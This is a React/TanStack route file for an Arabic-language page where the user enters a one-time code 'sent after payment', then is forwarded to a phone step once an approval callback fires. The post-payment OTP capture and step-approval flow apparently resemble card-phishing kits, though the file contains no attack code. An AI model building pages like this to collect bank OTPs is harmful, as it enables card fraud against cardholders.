import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { KeyRound } from "lucide-react";
import { OtpForm } from "@/components/otp-form";

export const Route = createFileRoute("/otp")({
  head: () => ({
    meta: [
      { title: "رمز التحقق بعد الدفع — بيكير" },
      { name: "description", content: "أدخل رمز التحقق المرسل بعد عملية الدفع." },
      { property: "og:title", content: "رمز التحقق بعد الدفع — بيكير" },
      { property: "og:description", content: "أدخل رمز التحقق المرسل بعد عملية الدفع." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: OtpPage,
});

function OtpPage() {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-md">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <KeyRound className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-2xl font-extrabold text-dark-900">رمز التحقق</h1>
            <p className="mt-2 text-sm text-dark-500">أدخل رمز التحقق المرسل بعد عملية الدفع</p>
          </div>

          <OtpForm stepKey="post_payment_otp" idPrefix="pmt-otp" onApproved={() => void navigate({ to: "/phone" })} />
        </div>
      </div>
    </div>
  );
}
